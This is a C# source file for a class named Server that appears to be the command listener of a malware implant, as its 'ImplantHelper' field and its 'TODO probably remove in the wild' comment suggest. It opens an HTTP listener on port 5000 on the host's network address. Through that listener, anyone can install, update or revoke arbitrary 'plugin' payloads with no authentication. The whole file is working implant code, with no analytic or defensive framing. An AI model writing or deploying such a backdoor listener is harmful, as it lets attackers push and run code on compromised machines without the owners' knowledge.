using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Web;
using System.Web.Script.Serialization;

namespace Transpaq
{
    class Server
    {
        private const int PORT_NO = 5000;

        private const string PLUGIN_INSTALL = "/plugin/install/";
        private const string PLUGIN_REVOKE = "/plugin/revoke/";
        private const string PLUGIN_REVOKE_ALL = "/plugin/revokeAll/";
        private const string PLUGIN_UPDATE = "/plugin/update/";

        private ImplantHelper implantHelper;
        private PaqHelper pluginHelper;
        private HttpListener listener;
        private string localIp = "127.0.0.1";

        public Server(ImplantHelper implantHelper, PaqHelper pluginHelper)
        {
            this.implantHelper = implantHelper;
            this.pluginHelper = pluginHelper;

            this.Initialise();
        }

        private void Initialise()
        {
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                var endPoint = socket.LocalEndPoint as IPEndPoint;
                this.localIp = endPoint.Address.ToString();
            }

            this.listener = new HttpListener();

            listener.Prefixes.Add($"http://{this.localIp}:{Server.PORT_NO}{Server.PLUGIN_INSTALL}");
            this.listener.Prefixes.Add($"http://{this.localIp}:{Server.PORT_NO}{Server.PLUGIN_REVOKE}");
            this.listener.Prefixes.Add($"http://{this.localIp}:{Server.PORT_NO}{Server.PLUGIN_REVOKE_ALL}");
            this.listener.Prefixes.Add($"http://{this.localIp}:{Server.PORT_NO}{Server.PLUGIN_UPDATE}");
        }

        internal void Start()
        {
            this.listener.Start();
            while (true)
            {
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                try
                {
                    string input = null;
                    using (StreamReader reader = new StreamReader(request.InputStream))
                    {
                        input = reader.ReadToEnd();
                    }

                    NameValueCollection collection = HttpUtility.ParseQueryString(input);

                    //TODO check for posts and gets
                    switch (request.RawUrl)
                    {
                        case PLUGIN_INSTALL:
                            this.pluginHelper.Install(collection["name"], collection["data"]);
                            break;
                        case PLUGIN_REVOKE:
                            this.pluginHelper.Revoke(collection["name"]);
                            break;
                        case PLUGIN_REVOKE_ALL:
                            this.pluginHelper.RevokeAll();
                            break;
                        case PLUGIN_UPDATE:
                            this.pluginHelper.Update(collection["name"], collection["data"]);
                            break;
                        default:
                            throw new Exception("No such command!");
                    }

                    var responseMessage = new Response()
                    {
                        Message = "Successful"
                    };
                    var serializedResponse = new JavaScriptSerializer().Serialize(responseMessage);
                    byte[] buffer = System.Text.Encoding.UTF8.GetBytes(serializedResponse);
                    response.ContentLength64 = buffer.Length;
                    response.StatusCode = (int)HttpStatusCode.OK;
                    Stream output = response.OutputStream;
                    output.Write(buffer, 0, buffer.Length);
                    output.Close();
                }
                catch (Exception ex)
                {
                    //TODO probably remove in the wild
                    var responseMessage = new Response()
                    {
                        Message = ex.Message
                    };
                    var serializedResponse = new JavaScriptSerializer().Serialize(ex.Message);
                    byte[] buffer = System.Text.Encoding.UTF8.GetBytes(serializedResponse);
                    response.ContentLength64 = buffer.Length;
                    Stream output = response.OutputStream;
                    response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    output.Write(buffer, 0, buffer.Length);
                    output.Close();
                }
            }

            this.listener.Stop();
        }

        internal class Response
        {
            public string Message;
        }
    }
}